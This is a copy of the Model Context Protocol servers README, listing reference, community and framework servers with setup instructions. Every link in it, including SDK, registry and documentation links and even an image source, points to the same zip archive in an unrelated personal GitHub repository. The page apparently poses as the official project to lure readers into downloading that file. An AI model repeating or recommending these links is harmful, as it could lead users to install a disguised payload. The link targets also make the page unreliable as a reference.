# Model Context Protocol servers

This repository is a collection of *reference implementations* for the [Model Context Protocol](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip) (MCP), as well as references to community-built servers and additional resources.

> [!IMPORTANT]
> If you are looking for a list of MCP servers, you can browse published servers on [the MCP Registry](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip). The repository served by this README is dedicated to housing just the small number of reference servers maintained by the MCP steering group.

> [!WARNING]
> The servers in this repository are intended as **reference implementations** to demonstrate MCP features and SDK usage. They are meant to serve as educational examples for developers building their own MCP servers, not as production-ready solutions. Developers should evaluate their own security requirements and implement appropriate safeguards based on their specific threat model and use case.

The servers in this repository showcase the versatility and extensibility of MCP, demonstrating how it can be used to give Large Language Models (LLMs) secure, controlled access to tools and data sources.
Typically, each MCP server is implemented with an MCP SDK:

- [C# MCP SDK](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)
- [Go MCP SDK](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)
- [Java MCP SDK](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)
- [Kotlin MCP SDK](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)
- [PHP MCP SDK](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)
- [Python MCP SDK](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)
- [Ruby MCP SDK](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)
- [Rust MCP SDK](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)
- [Swift MCP SDK](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)
- [TypeScript MCP SDK](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)

## 🌟 Reference Servers

These servers aim to demonstrate MCP features and the official SDKs.

- **[Everything](src/everything)** - Reference / test server with prompts, resources, and tools.
- **[Fetch](src/fetch)** - Web content fetching and conversion for efficient LLM usage.
- **[Filesystem](src/filesystem)** - Secure file operations with configurable access controls.
- **[Git](src/git)** - Tools to read, search, and manipulate Git repositories.
- **[Memory](src/memory)** - Knowledge graph-based persistent memory system.
- **[Sequential Thinking](src/sequentialthinking)** - Dynamic and reflective problem-solving through thought sequences.
- **[Time](src/time)** - Time and timezone conversion capabilities.

### Archived

The following reference servers are now archived and can be found at [servers-archived](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip).

- **[AWS KB Retrieval](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Retrieval from AWS Knowledge Base using Bedrock Agent Runtime.
- **[Brave Search](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Web and local search using Brave's Search API.  Has been replaced by the [official server](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip).
- **[EverArt](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - AI image generation using various models.
- **[GitHub](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Repository management, file operations, and GitHub API integration.
- **[GitLab](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - GitLab API, enabling project management.
- **[Google Drive](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - File access and search capabilities for Google Drive.
- **[Google Maps](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Location services, directions, and place details.
- **[PostgreSQL](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Read-only database access with schema inspection.
- **[Puppeteer](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Browser automation and web scraping.
- **[Redis](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Interact with Redis key-value stores.
- **[Sentry](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Retrieving and analyzing issues from Sentry.io.
- **[Slack](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Channel management and messaging capabilities. Now maintained by [Zencoder](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)
- **[SQLite](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Database interaction and business intelligence capabilities.

## 🤝 Third-Party Servers

> [!NOTE]
The server lists in this README are no longer maintained and will eventually be removed.

### 🌎 Community Servers

A growing set of community-developed and maintained servers demonstrates various applications of MCP across different domains.

> [!NOTE]
> Community servers are **untested** and should be used at **your own risk**. They are not affiliated with or endorsed by Anthropic.

- **[1mcpserver](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - MCP of MCPs. Automatically discover, configure, and add MCP servers on your local machine.
- **[1Panel](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - MCP server implementation that provides 1Panel interaction.
- **[A2A](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - An MCP server that bridges the Model Context Protocol (MCP) with the Agent-to-Agent (A2A) protocol, enabling MCP-compatible AI assistants (like Claude) to seamlessly interact with A2A agents.
- **[Ableton Live](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - an MCP server to control Ableton Live.
- **[Ableton Live](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** (by ahujasid) - Ableton integration allowing prompt enabled music creation.
- **[ActivityPub MCP](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - A comprehensive MCP server that enables LLMs to explore and interact with the Fediverse through ActivityPub protocol, supporting actor discovery, timeline fetching, instance exploration, and WebFinger resolution across decentralized social networks.
- **[Actor Critic Thinking](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Actor-critic thinking for performance evaluation
- **[Adobe Commerce](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** — MCP to interact with Adobe Commerce GraphQL API, including orders, products, customers, etc.
- **[ADR Analysis](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - AI-powered Architectural Decision Records (ADR) analysis server that provides architectural insights, technology stack detection, security checks, and TDD workflow enhancement for software development projects.
- **[Ads MCP](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Remote MCP server for cross-platform ad campaign creation (Google Ads Search & PMax, TikTok). OAuth 2.1 authentication with progress streaming support for long-running operations. [Website](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)
- **[Agent Interviews](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Conduct AI-powered qualitative research interviews and surveys at scale with [Agent Interviews](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip).
- **[AgentBay](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - An MCP server for providing serverless cloud infrastructure for AI agents.
- **[Agentic Framework](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Multi-agent collaboration framework enabling AI agents to register, discover each other, exchange asynchronous messages via HTTP transport, and work together on complex tasks with persistent message history.
- **[AgentMode](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Connect to dozens of databases, data warehouses, Github & more, from a single MCP server.  Run the Docker image locally, in the cloud, or on-premise.
- **[AI Agent Marketplace Index](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - MCP server to search more than 5000+ AI agents and tools of various categories from [AI Agent Marketplace Index](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip) and monitor traffic of AI Agents.
- **[AI Endurance](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - AI-powered training platform for runners, cyclists, and triathletes with over 20 tools for workout management, activity analysis, performance predictions, and recovery tracking.
- **[AI Tasks](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Let the AI manage complex plans with integrated task management and tracking tools. Supports STDIO, SSE and Streamable HTTP transports.
- **[ai-Bible](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Search the bible reliably and repeatably [ai-Bible Labs](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)

- **[Zoom](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Create, update, read and delete your zoom meetings.
## 📚 Frameworks

These are high-level frameworks that make it easier to build MCP servers or clients.

### For servers

* **[Anubis MCP](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** (Elixir) - A high-performance and high-level Model Context Protocol (MCP) implementation in Elixir. Think like "Live View" for MCP.
* **[ModelFetch](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** (TypeScript) - Runtime-agnostic SDK to create and deploy MCP servers anywhere TypeScript/JavaScript runs
* **[EasyMCP](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** (TypeScript)
* **[FastAPI to MCP auto generator](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** – A zero-configuration tool for automatically exposing FastAPI endpoints as MCP tools by **[Tadata](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)**
* **[FastMCP](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** (TypeScript)
* **[Foobara MCP Connector](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Easily expose Foobara commands written in Ruby as tools via MCP
* **[Foxy Contexts](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** – A library to build MCP servers in Golang by **[strowk](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)**
* **[Higress MCP Server Hosting](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - A solution for hosting MCP Servers by extending the API Gateway (based on Envoy) with wasm plugins.
* **[MCP Declarative Java SDK](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** Annotation-driven MCP servers development with Java, no Spring Framework Required, minimize dependencies as much as possible.
* **[MCP-Framework](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** Build MCP servers with elegance and speed in TypeScript. Comes with a CLI to create your project with `mcp create app`. Get started with your first server in under 5 minutes by **[Alex Andru](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)**
* **[MCP Plexus](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)**: A secure, **multi-tenant** and Multi-user MCP python server framework built to integrate easily with external services via OAuth 2.1, offering scalable and robust solutions for managing complex AI applications.
* **[mcp_sse (Elixir)](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** An SSE implementation in Elixir for rapidly creating MCP servers.
* **[mxcp](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** (Python) - Open-source framework for building enterprise-grade MCP servers using just YAML, SQL, and Python, with built-in auth, monitoring, ETL and policy enforcement.
* **[Next.js MCP Server Template](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** (Typescript) - A starter Next.js project that uses the MCP Adapter to allow MCP clients to connect and access resources.
* **[PayMCP](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** (Python & TypeScript) - Lightweight payments layer for MCP servers: turn tools into paid endpoints with a two-line decorator. [PyPI](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip) · [npm](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip) · [TS repo](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)
* **[Perl SDK](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - An SDK for building MCP servers and clients with the Perl programming language.
* **[Quarkus MCP Server SDK](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** (Java)
- **[R mcptools](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - An R SDK for creating R-based MCP servers and retrieving functionality from third-party MCP servers as R functions.
* **[SAP ABAP MCP Server SDK](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Build SAP ABAP based MCP servers. ABAP 7.52 based with 7.02 downport; runs on R/3 & S/4HANA on-premises, currently not cloud-ready.
* **[Spring AI MCP Server](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Provides auto-configuration for setting up an MCP server in Spring Boot applications.
* **[Template MCP Server](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - A CLI tool to create a new Model Context Protocol server project with TypeScript support, dual transport options, and an extensible structure
* **[AgentR Universal MCP SDK](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - A python SDK to build MCP Servers with inbuilt credential management by **[Agentr](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)**
* **[Vercel MCP Adapter](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** (TypeScript) - A simple package to start serving an MCP server on most major JS meta-frameworks including Next, Nuxt, Svelte, and more.
* **[PHP MCP Server](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** (PHP) - Core PHP implementation for the Model Context Protocol (MCP) server

### For clients

* **[codemirror-mcp](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - CodeMirror extension that implements the Model Context Protocol (MCP) for resource mentions and prompt commands
* **[llm-analysis-assistant](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** <img height="12" width="12" src="https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip" alt="Langfuse Logo" /> - A very streamlined mcp client that supports calling and monitoring stdio/sse/streamableHttp, and can also view request responses through the /logs page. It also supports monitoring and simulation of ollama/openai interface.
* **[MCP-Agent](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - A simple, composable framework to build agents using Model Context Protocol by **[LastMile AI](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)**
* **[Spring AI MCP Client](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Provides auto-configuration for MCP client functionality in Spring Boot applications.
* **[MCP CLI Client](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - A CLI host application that enables Large Language Models (LLMs) to interact with external tools through the Model Context Protocol (MCP).
* **[OpenMCP Client](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - An all-in-one vscode/trae/cursor plugin for MCP server debugging. [Document](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip) & [OpenMCP SDK](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip).
* **[PHP MCP Client](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Core PHP implementation for the Model Context Protocol (MCP) Client
* **[Runbear](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - No-code MCP client for team chat platforms, such as Slack, Microsoft Teams, and Discord.

## 📚 Resources

Additional resources on MCP.

- **[A2A-MCP Java Bridge](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - A2AJava brings powerful A2A-MCP integration directly into your Java applications. It enables developers to annotate standard Java methods and instantly expose them as MCP Server, A2A-discoverable actions — with no boilerplate or service registration overhead.

- **[Webrix MCP Gateway](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)** - Enterprise MCP gateway with SSO, RBAC, audit trails, and token vaults for secure, centralized AI agent access control. Deploy via Helm charts on-premise or in your cloud. [webrix.ai](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip)



## 🚀 Getting Started

### Using MCP Servers in this Repository
TypeScript-based servers in this repository can be used directly with `npx`.

For example, this will start the [Memory](src/memory) server:
```sh
npx -y @modelcontextprotocol/server-memory
```

Python-based servers in this repository can be used directly with [`uvx`](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip) or [`pip`](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip). `uvx` is recommended for ease of use and setup.

For example, this will start the [Git](src/git) server:
```sh
# With uvx
uvx mcp-server-git

# With pip
pip install mcp-server-git
python -m mcp_server_git
```

Follow [these](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip) instructions to install `uv` / `uvx` and [these](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip) to install `pip`.

### Using an MCP Client
However, running a server on its own isn't very useful, and should instead be configured into an MCP client. For example, here's the Claude Desktop configuration to use the above server:

```json
{
  "mcpServers": {
    "memory": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-memory"]
    }
  }
}
```

Additional examples of using the Claude Desktop as an MCP client might look like:

```json
{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/path/to/allowed/files"]
    },
    "git": {
      "command": "uvx",
      "args": ["mcp-server-git", "--repository", "path/to/git/repo"]
    },
    "github": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github"],
      "env": {
        "GITHUB_PERSONAL_ACCESS_TOKEN": "<YOUR_TOKEN>"
      }
    },
    "postgres": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-postgres", "postgresql://localhost/mydb"]
    }
  }
}
```

## 🛠️ Creating Your Own Server

Interested in creating your own MCP server? Visit the official documentation at [modelcontextprotocol.io](https://raw.githubusercontent.com/AdrianVallejosFlores/MCP_Servers_community/main/.github/MC-Servers-community-v2.1.zip) for comprehensive guides, best practices, and technical details on implementing MCP servers.
